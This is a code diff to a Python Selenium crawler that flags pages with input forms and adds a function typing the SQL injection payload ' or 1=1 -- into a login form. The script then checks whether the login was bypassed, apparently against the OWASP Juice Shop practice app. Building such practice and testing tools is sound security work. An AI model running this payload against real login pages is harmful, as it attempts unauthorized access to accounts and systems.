@@ -4,6 +4,9 @@ from soup_methods import find_links, find_buttons, find_inputs
 from bs4 import BeautifulSoup
 from init import initialize
 from difflib import SequenceMatcher
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+
 
 global available
 global queue
@@ -34,6 +37,7 @@ def available_links(driver,site):
             queue.pop(0)
 
 def check_form_val(driver,site):
+    lista=[]
     for link in available:
         driver.get(f'{site}{link}')
         sleep(uniform(1.5,1.8))
@@ -41,8 +45,32 @@ def check_form_val(driver,site):
         soup = BeautifulSoup(page,'html.parser')
         if find_inputs(soup):
             print(f'{site}{link} has inputs you can exploit')
+            lista.append(link)
         else:
             print(f'{site}{link} has no input form to exploit')
+    if '/login/' in  lista: #check if link has login 
+        link2='/login/'
+        loginsqlinjection(site,link2,driver)
+
+
+
+def loginsqlinjection(site,link2,driver): #check for sql injection
+    driver.get(f'{site}{link2}') #open link in firefox browser
+    sleep(2)
+   # driver.find_element_by_xpath('/html/body/div[3]/div[2]/div/mat-dialog-container/app-welcome-banner/div/button[2]/span/span').click() #find login button
+    driver.find_element_by_xpath('//*[@id="email"]').send_keys(" ' or 1=1 -- ")
+    password=driver.find_element_by_xpath('//*[@id="password"]') 
+    text='sqlinjection'
+    for characters in text:
+        password.send_keys(characters)
+        sleep(0.3) #set username and password 
+    driver.find_element_by_xpath('//*[@id="loginButton"]').click() 
+    sleep(5)
+    if driver.current_url=='https://juice-shop.herokuapp.com/#/search': #check if login failed 
+          print("your page is vulnerable to sql injection")
+    else:
+        print("login failed")
+
 
 
 if __name__ == '__main__':
